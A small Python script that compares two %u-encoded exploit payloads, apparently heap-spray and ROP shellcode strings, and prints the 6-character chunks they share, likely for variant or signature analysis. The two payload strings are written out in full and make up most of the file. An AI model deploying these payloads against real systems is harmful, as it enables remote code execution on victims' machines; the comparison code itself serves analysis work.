# coding=utf-8
"""
DATE:   2021/3/23
AUTHOR: Yanxi Li
"""

payload1="%u6750%u565a%u5566%u7a6f%u6551%u5450%u6f54%u7a62%u4653%u6b41%u1806%u101f%u828c%u1083%u0d7b%u103e%u8002%u102d%u876b%u1003%u0001%u1004%u0001%u0000%u6917%u104e%u1000%u0000%uc000%u102a%u0040%u0000%u0005%u102e%uc001%u102a%u1806%u101f%u9090%u9090%u3401%u102b%u0cbc%u0c0c%ubb0c%ufe0f%u53c6%udddb%u74d9%uf424%u2958%ub1c9%u834b%ufce8%u5831%u030e%uf057%ua624%ue49b%u4926%uf563%u7b58%u91b1%u2913%ud105%uc276%ub7ee%u5362%ubc15%u4bf9%u3ce4%u3cf2%ue54c%u833c%ud5fc%u7f5f%u09fe%ube80%u5c31%u87c1%u2a84%u552e%u5e41%u4ae2%u22e6%u6a3f%u2928%u147f%uee4d%ua8f4%u3f4c%u687f%ube6e%ud953%u88e5%u5f4b%u7c30%u1650%u82f3%u9c23%u7d78%uece2%ubfbe%u02c5%u4192%u241d%u340a%u5655%u4fb7%u24ae%uc563%u8e31%u7de0%u2e96%u1b25%u3c5d%u6f82%u2139%ua315%u5d31%u429e%ud796%u60e4%ub332%u09bf%u1963%u356e%uc573%u93cf%ue4ff%ua306%uf6ff%uf927%u3b97%u02e5%u5468%u707e%ufb5a%u1ed4%u74d6%ud9f2%u926f%u3505%uf3d7%ub6f8%udd28%ue23e%u7578%u8b97%u8512%u5e18%u8f8e%ua18e%ubce7%u4ac9%ubcfa%ud6c4%u5a73%ub6b6%uf3d3%u6776%ua394%u6d1e%u9b1b%u8e3e%ub4f1%u61d4%uedac%u1b40%u66f5%ue4f1%u0323%u6e31%uf3c0%u87ff%ue7ad%u6797%u5af8%u7731%uf1d6%uedbd%u53dd%u99ea%u82df%u05dc%ue11f%u8f57%u4ab5%uf00f%u4b59%ua6cf%u4b33%u1ea7%u1860%u60d2%u0cbd%uf54f%u653e%u5e3c%u8b57%ua81b%u74f8%u284e%ua2c4%u5eb6%u7724"

payload2="%u5075%u4c6f%u6779%u7371%u6942%u7a51%u5556%u7451%u4248%u6153%u1806%u101f%u828c%u1083%u0d7b%u103e%u8002%u102d%u876b%u1003%u0001%u1004%u0001%u0000%u6917%u104e%u1000%u0000%uc000%u102a%u0040%u0000%u0005%u102e%uc001%u102a%u1806%u101f%u9090%u9090%u3401%u102b%u0cbc%u0c0c%uda0c%ubdd8%u21f2%ufd61%u74d9%uf424%u2958%ub1c9%u3147%u1a68%u6803%u831a%u04c0%u07e2%u89dd%ue77f%u4a1e%u6ee0%u7bfb%u1420%u2c8f%u5f90%uc0dd%u0d5b%u53f6%u9929%ud4f9%uff84%ue434%uc3b5%u6657%u17c4%u57b8%u6a07%u90b9%u867a%u49eb%u34f0%ufd1c%u844c%u4d97%u8c40%u0544%ubd63%u1dda%u1d3a%uf2dc%u1436%u17c6%uef72%ue37d%uee08%u3d57%u5cf0%uf196%u9d03%u36de%ue8fc%u4516%uea81%u37ec%u7f5d%u90f7%u2716%u21d3%ub1fa%u2e90%ub6b7%u32ff%u1b46%u4e74%u9ac3%uc65b%ub897%u827f%ua14c%u6e26%ude22%ud139%u7a9b%ufc31%uf7c8%u6918%u353c%u69a3%u4e2a%u5bd0%ue4f5%ud07e%u227e%u6178%ud568%uc956%u28f9%u2a57%ueed3%u7a03%uc74b%u112b%ue88b%u8cf9%u7e81%uf9c2%uff39%ufbaa%uee45%u7576%u40a3%ud5d7%u207c%u9587%uc82c%u19cd%ue812%uf3ed%u823b%uaa01%u3a14%uf7bb%udbef%u2244%udb8a%uc1cf%u956a%uaf27%u4178%ufac8%uc723%ud0d7%ue74e%udf4d%ub0d8%uddf9%uf63d%u1ea5%u8d68%u8b6c%uf9d3%u5b90%uf9d4%u31c6%u91d4%u61be%u8487%ubfc0%u15bb%u4055%ucaea%u28fe%u3510%uf6c8%u10eb%ucbc8%u5c3d%u25be%u41fe"

head = 0
next = 0
jump = 6


p1 = [payload1[i*jump:i*jump+jump] for i in range(len(payload1)//jump)]

p2 = [payload2[i*jump:i*jump+jump] for i in range(len(payload2)//jump)]


for i in p1:
    if i in p2:
        print(i)